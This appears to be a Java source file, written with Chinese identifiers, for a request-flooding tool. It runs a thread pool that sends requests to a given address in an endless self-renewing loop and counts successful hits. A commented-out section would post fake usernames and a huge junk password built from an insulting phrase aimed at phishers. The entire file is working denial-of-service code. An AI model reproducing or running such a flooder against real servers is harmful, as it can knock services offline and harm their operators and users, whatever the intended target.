package h.kl.util;

import 放课后乐园部.收集.*;
import 放课后乐园部.网络.*;
import 放课后乐园部.基本.*;
import 放课后乐园部.事件.*;
import java.util.concurrent.*;
import 放课后乐园部.视图.*;

public class 连接管理 {

    static ExecutorService 线程池;
    public static 计数 已完成 = new 计数();

    static int 数量;
    static String 地址;
    static 文本控件 状态;
    static 文本控件 成功;
    
    static 通用方法 停止;

    public static void 初始化(int $数量,String $地址,文本控件 $状态,文本控件 $成功,通用方法 $停止) {
        线程池 = Executors.newFixedThreadPool($数量);
        数量 = $数量;
        地址 = $地址;
        状态 = $状态;
        成功 = $成功;
        停止 = $停止;
    }

    public static void 启动() {
        批量发送(地址, 数量);
    }

    public static void 停止() {
        线程池.shutdownNow();
    }

    public static void 批量发送(String $地址,int $数量) {
        for (int $键值 = 0;$键值 < $数量;$键值 ++) {
            新建发送($地址);
        }
    }

    public static String 字符;


    static {
        StringBuffer 创建 = new StringBuffer("钓鱼死妈");
        for (int $键值 = 0;$键值 < 10;$键值 ++) {
            创建.append(创建);
        }
        字符 = 创建.toString();
    }

    public static void 新建发送(final String $地址) {
        线程池.execute(new 可运行类(new 通用方法() {
                            @Override
                            public Object 调用(Object[] $参数) {
                                连接 $请求 = new 连接($地址);
                                /*
                                $请求.置类型("POST");
                                $请求.参数("username", "MikaGura N"+时间.时间戳());
                                $请求.参数("password", 字符);
                               */
                                try {
                                   
                                    $请求.取输入流();
                                    
                                    
 
                                        处理.主线程(更新视图($请求.取状态码()));
                                        
                                        新建发送($地址);
                                    
                                   
                                } catch (Exception $错误) {
                                    错误.保存($错误);
                                }

                                return null;
                            }
                        }));
    }

    static 通用方法 更新视图(final int $状态码) {
        return new 通用方法() {
            @Override
            public Object 调用(Object[] $参数) {
                已完成.加一();
                状态.置文本("返回状态码:" + $状态码);
                成功.置文本("请求成功:" + 已完成.读取());
                return null;
            }
        };
    }


}
